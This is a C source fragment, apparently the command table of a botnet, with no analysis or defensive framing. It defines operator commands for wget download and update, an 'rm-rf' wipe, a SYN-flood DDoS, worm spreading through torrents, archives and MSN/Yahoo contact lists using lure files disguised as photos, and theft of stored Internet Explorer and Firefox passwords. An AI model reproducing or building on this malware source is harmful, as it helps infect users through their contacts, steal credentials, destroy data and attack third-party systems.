/*
		.   ..---..-. 
		|\  ||   (   )
		| \ ||--- `-. 
		|  \||   (   )bot [version 5]
		'   ''---'`-' [msn,tor,yah,p2p,usb,cd-rom,rem-drive]
		Ripped - Copy - Paste

*/

/* -- fake cmds -- */
const char cmd_fake_remove[]    = "remove";
const char cmd_fakedownload[]   = "download";
const char cmd_fakeupdate[]     = "update";


/* -- !important! -- */
const char get_mnd1[]			= "wget";
const char get_upd1[]			= "wget-newer";
const char cmd_remove_1[]		= "rm-rf";


/* -- ddos -- */
const char cmd_ddos_supersyn[]	= "ddos-ssyn";


/* -- core -- */
const char get_auth1[]			= "su";
const char cmd_join_1[]			= "j";
const char cmd_part_1[]			= "p";

/* -- spreading -- */
//torrent - ex; .seed http://file.rar.torrent C:\file.rar.torrent C:\file.rar
const char cmd_seed[]			= "seed";

//archive
const char cmd_rarworm[]		= "rar";
const char cmd_zipworm[]		= "zip";

//im
const char cmd_msnfile1_on[]	= "m1";		  //msn v1 - full contact list [random msg] + sendfile (SonyCam#######.JPG-www.photobucket.com)
const char cmd_msnfile1_off[]	= "stopm1";

const char cmd_msnfile2_on[]	= "m2";		  //msn v2 - full contact list [msg] + sendfile (email_###.JPEG-www.myspace.com)
const char cmd_msnfile2_off[]	= "stopm2";

const char cmd_yahoospread[]	= "y";		  //yahoo full contact list [msg]

const char cmd_yahoospread2[]	= "y2";		  //yahoo full contact list [msg] + sendfile

const char cmd_skypespread[]	= "skype";    //not done
const char cmd_skypespread2[]	= "stopskype";

const char cmd_xfirespread[]	= "xfire";	  //not done
const char cmd_xfirespread2[]	= "stopxfire";


/* -- information -- */
const char cmd_pstoreIE_1[]		= "ie";
const char cmd_pstoreIE_2[]		= "ie-find";  //not done
const char cmd_pstoreFF[]		= "ff";		  
const char cmd_pstoreFF2[]		= "ff-find";  //not done


/* -- depreciated -- */
const char cmd_logout_1[]		= "bye";      
const char cmd_threads_1[]		= "thread";       
const char cmd_threads_sub[]	= "sub";     
const char cmd_threads_kill_1[]	= "thread-kill";   
